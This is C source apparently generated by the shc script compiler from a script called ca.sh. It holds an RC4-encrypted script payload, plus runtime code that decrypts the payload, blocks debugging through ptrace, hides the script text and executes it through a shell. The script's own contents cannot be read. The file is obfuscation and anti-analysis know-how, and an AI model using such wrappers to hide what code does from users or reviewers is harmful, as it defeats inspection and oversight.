#if 0
	shc Version 3.8.9, Generic Script Compiler
	Copyright (c) 1994-2012 Francisco Rosales <frosal@fi.upm.es>

	shc -rv -f ca.sh 
#endif

static  char data [] = 
#define      msg1_z	42
#define      msg1	((&data[6]))
	"\117\163\111\254\160\276\014\076\306\345\245\050\246\101\333\154"
	"\152\221\002\053\305\024\372\222\250\112\213\034\061\237\001\007"
	"\100\257\147\324\053\202\267\324\041\036\140\341\247\125\236\027"
	"\160\261\175\170\157\223\116\244"
#define      chk2_z	19
#define      chk2	((&data[56]))
	"\007\305\171\031\367\012\130\237\324\176\337\107\233\110\066\236"
	"\312\214\311\325"
#define      text_z	816
#define      text	((&data[239]))
	"\371\030\347\314\343\033\155\377\253\061\117\037\172\374\217\071"
	"\155\100\266\345\260\112\064\125\074\143\261\021\062\175\055\053"
	"\225\024\370\171\057\146\171\333\230\311\372\023\306\212\114\063"
	"\312\003\031\173\115\115\320\211\260\202\233\343\377\311\017\225"
	"\335\007\017\015\155\211\351\006\122\344\031\030\156\145\114\071"
	"\150\145\264\266\263\205\100\144\007\334\107\007\245\126\235\203"
	"\136\254\220\314\066\171\322\210\136\353\241\314\120\355\005\271"
	"\122\272\157\006\077\260\152\107\214\262\117\062\010\354\265\146"
	"\231\105\063\317\277\005\130\035\360\371\352\101\346\360\372\071"
	"\252\152\077\352\032\252\062\247\134\201\331\145\155\216\314\007"
	"\324\377\326\064\337\203\026\243\070\064\072\164\071\017\001\161"
	"\123\346\162\344\212\377\044\341\135\254\135\145\267\065\067\173"
	"\265\067\126\050\177\176\162\233\311\371\043\102\011\230\205\277"
	"\044\000\017\375\062\155\333\066\233\007\336\302\052\027\350\002"
	"\106\373\070\232\255\056\342\104\105\265\143\075\261\152\271\122"
	"\063\036\024\325\045\107\212\304\163\057\274\231\331\344\006\100"
	"\047\107\103\367\073\214\003\272\211\147\007\007\234\216\216\357"
	"\342\367\161\101\310\176\332\122\343\246\236\110\315\120\044\101"
	"\355\205\114\020\043\324\251\363\243\326\077\337\126\240\272\204"
	"\301\362\326\010\363\146\005\273\125\100\350\267\307\224\301\136"
	"\363\217\100\016\152\011\221\022\356\035\155\346\141\055\176\075"
	"\131\213\311\216\045\062\243\172\256\033\034\055\204\265\373\131"
	"\271\221\026\201\135\317\160\320\127\116\231\041\214\243\170\332"
	"\060\250\011\306\325\010\315\365\055\303\133\335\117\117\312\337"
	"\236\165\004\145\024\341\107\075\074\042\200\017\131\317\112\275"
	"\256\354\211\051\141\174\300\066\364\243\116\221\333\215\137\003"
	"\055\265\304\170\131\115\121\145\173\110\140\171\260\041\021\147"
	"\365\363\027\365\025\166\217\071\204\200\113\370\232\016\041\223"
	"\057\160\337\115\353\353\026\174\105\064\151\277\311\334\264\215"
	"\364\233\320\101\114\222\204\145\102\221\364\037\321\165\203\174"
	"\001\147\007\317\260\301\314\204\361\163\205\237\266\157\356\164"
	"\161\027\174\161\227\000\260\102\372\160\352\116\253\136\303\325"
	"\221\141\140\027\150\160\350\301\002\060\225\304\046\307\072\201"
	"\135\171\247\325\063\024\046\356\020\063\125\114\060\345\155\020"
	"\273\312\107\357\004\010\232\153\362\305\114\064\314\245\045\217"
	"\264\377\370\135\310\017\342\173\064\134\152\132\126\351\224\217"
	"\117\054\050\277\340\304\152\043\346\252\341\131\207\001\315\003"
	"\206\215\377\177\055\374\244\340\066\247\322\013\026\063\067\363"
	"\306\254\103\107\004\165\006\156\253\211\116\222\337\127\132\343"
	"\025\105\036\313\204\302\031\333\204\071\264\357\377\106\303\171"
	"\163\312\356\310\324\012\313\136\203\134\075\345\005\337\252\076"
	"\047\245\257\240\027\176\164\063\325\023\211\041\150\233\013\266"
	"\325\144\331\103\046\325\037\242\161\013\216\141\022\006\373\211"
	"\127\077\234\152\260\015\330\115\134\062\270\154\372\035\013\006"
	"\111\233\272\301\121\003\356\044\346\221\342\201\152\237\157\044"
	"\055\352\222\265\027\363\324\203\041\341\225\266\052\377\034\133"
	"\345\170\206\140\316\363\067\251\006\102\125\106\357\351\037\270"
	"\213\220\065\163\133\056\126\014\167\313\210\152\114\026\261\170"
	"\221\215\000\144\206\345\215\164\165\357\220\275\333\244\232\320"
	"\153\076\304\117\142\227\131\310\244\244\074\000\225\132\340\062"
	"\101\027\161\211\044\216\306\063\347\206\137\276\376\134\146\012"
	"\370\227\164\361\035\203\117\307\216\066\142\163\262\070\264\247"
	"\337\325\141\047\272\232\002\016\243\002\231\333\331\236\030\264"
	"\045\361\152\047\256\264\302\366\304\030\223\145\144\034\256\113"
	"\371\012\356\045\107\273\116\240\235\001\227\036\336\201\254\302"
	"\113\323\066\071\241\165\170\255\355\331\351\315\113\270\072\005"
	"\042\143\117\172\250\306\211\301\101\104\222\354\353\356\157\162"
	"\125\002\070\342\100\276\015\024\322\225\074\023\357\261\341\034"
	"\373\073\164\045\224\045\236\013\045\055\365\015\107\325\370\372"
	"\061\174\202\046\330\063\333\233\156\135\316\070\122\000\151\013"
	"\122\301\137\177\375\133\231\053\022\076\222\135\210\217\020\312"
	"\140\126\140\224\004\057\261\365\050\234\066\016\214\061\110\067"
	"\234\210\041\267\063\124\136\217"
#define      tst2_z	19
#define      tst2	((&data[1077]))
	"\103\331\174\326\003\142\223\232\213\313\024\306\053\223\351\131"
	"\035\352\024\256\307\301\112\233"
#define      opts_z	1
#define      opts	((&data[1100]))
	"\306"
#define      pswd_z	256
#define      pswd	((&data[1121]))
	"\274\171\175\363\210\012\044\320\101\300\130\143\170\213\267\327"
	"\033\215\017\021\242\232\267\341\007\256\113\265\347\260\232\203"
	"\161\323\140\373\204\063\221\012\054\044\062\017\211\306\372\367"
	"\060\150\346\322\002\235\264\012\113\000\277\063\260\131\266\042"
	"\055\026\036\261\111\257\274\166\324\356\206\135\264\200\124\345"
	"\350\072\270\353\330\155\365\043\155\265\126\036\016\015\100\073"
	"\044\136\355\156\016\252\344\342\230\152\100\115\353\225\063\324"
	"\317\353\277\247\131\264\313\306\152\042\345\170\057\046\264\123"
	"\205\242\302\223\114\246\166\345\021\266\063\375\113\146\321\033"
	"\122\221\303\253\106\217\162\260\261\127\051\341\175\335\065\002"
	"\200\367\226\314\236\014\262\257\303\345\255\017\113\176\053\236"
	"\020\356\111\126\175\273\006\057\023\057\020\221\015\106\224\215"
	"\075\052\132\334\067\014\214\373\361\071\012\075\270\065\333\310"
	"\044\045\036\242\341\045\321\364\125\342\206\142\051\032\357\147"
	"\104\112\103\174\126\317\167\110\010\202\205\301\270\141\211\334"
	"\206\250\177\147\315\120\134\042\063\342\205\134\374\165\304\101"
	"\277\007\275\025\326\065\136\337\267\344\240\157\105\052\114\314"
	"\323\313\063\241\320\326\323\033\162\224\075\241\133\216\203\027"
	"\007\001\012\217\013\057\140\114\360\271\260\150\104\147\077\140"
	"\365\117\161\305\046\104\341\230\331\036\072\064\255\276\114\265"
	"\277\126\104\312\205\244\027\166\135\307\336\242\057"
#define      date_z	1
#define      date	((&data[1434]))
	"\052"
#define      lsto_z	1
#define      lsto	((&data[1435]))
	"\123"
#define      chk1_z	22
#define      chk1	((&data[1440]))
	"\054\223\352\147\323\176\235\074\101\276\161\153\267\202\314\116"
	"\352\307\347\351\105\274\317\250\052\010\310\230\045\024"
#define      inlo_z	3
#define      inlo	((&data[1466]))
	"\107\071\045"
#define      msg2_z	19
#define      msg2	((&data[1472]))
	"\067\306\147\005\323\024\026\037\117\063\105\364\345\150\153\163"
	"\271\225\152\374\310\271\224\216\106\067"
#define      shll_z	10
#define      shll	((&data[1496]))
	"\343\354\242\050\175\177\074\345\122\364\370"
#define      xecc_z	15
#define      xecc	((&data[1508]))
	"\146\152\351\225\254\164\117\176\002\025\066\017\213\253\072\135"
	"\307\231\222\375"
#define      tst1_z	22
#define      tst1	((&data[1531]))
	"\034\037\332\152\004\154\053\107\152\166\321\316\114\107\250\011"
	"\100\376\262\100\036\000\231\344\312\227\260\105\374\263\066"
#define      rlax_z	1
#define      rlax	((&data[1557]))
	"\105"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = getenv("_");
	if (me == NULL) { me = argv[0]; }

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
